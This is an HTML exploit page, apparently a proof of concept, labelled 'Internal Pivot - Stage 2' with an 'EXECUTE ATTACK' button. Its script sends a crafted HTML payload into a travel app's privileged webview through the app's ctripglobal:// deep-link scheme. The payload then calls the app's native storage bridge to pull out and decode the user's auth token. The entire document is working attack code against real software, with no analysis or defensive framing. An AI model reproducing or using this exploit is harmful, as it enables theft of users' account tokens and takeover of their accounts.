<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Internal Pivot - Stage 2</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: monospace; text-align: center; padding: 50px; }
        .btn { background: #238636; color: white; padding: 20px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
        #status { margin-top: 20px; color: #8b949e; }
    </style>
</head>
<body>
    <h1>INTERNAL PIVOT ACTIVE</h1>
    <p>Target: Account Token Exfiltration</p>

    <button class="btn" onclick="execute()">EXECUTE ATTACK</button>
    <div id="status">System Ready...</div>

    <script>
        function execute() {
            document.getElementById('status').innerText = "Redirecting to Privileged Layer...";
            
            // The final payload to be executed in the privileged container
            const payload = `
            <html><body style="background:black;color:lime;padding:20px;font-family:monospace;">
                <h2>[+] BRIDGE ACCESS GRANTED</h2>
                <div id="data">Extracting Auth Token...</div>
                <script>
                    window.__bridge_callback = function(d) {
                        try {
                            var dec = atob(d);
                            document.getElementById('data').innerHTML = "<h3>FOUND TOKEN:</h3>" + dec;
                        } catch(e) { document.getElementById('data').innerText = "Error: " + e.message; }
                    };
                    setTimeout(function() {
                        if(window.IBUStorageV2_a) {
                            window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
                                "bussiness": "common", 
                                "key": "token",
                                "callback_tagname": "tok"
                            }));
                        }
                    }, 1000);
                <\/script>
            </body></html>`;

            // Using the app's native scheme to avoid -1203 network errors
            // We pass the payload into the HTML_DATA_TO_LOAD parameter
            const finalUrl = "ctripglobal://webview?HTML_DATA_TO_LOAD=" + encodeURIComponent(payload);
            
            window.location.href = finalUrl;
        }
    </script>
</body>
</html>
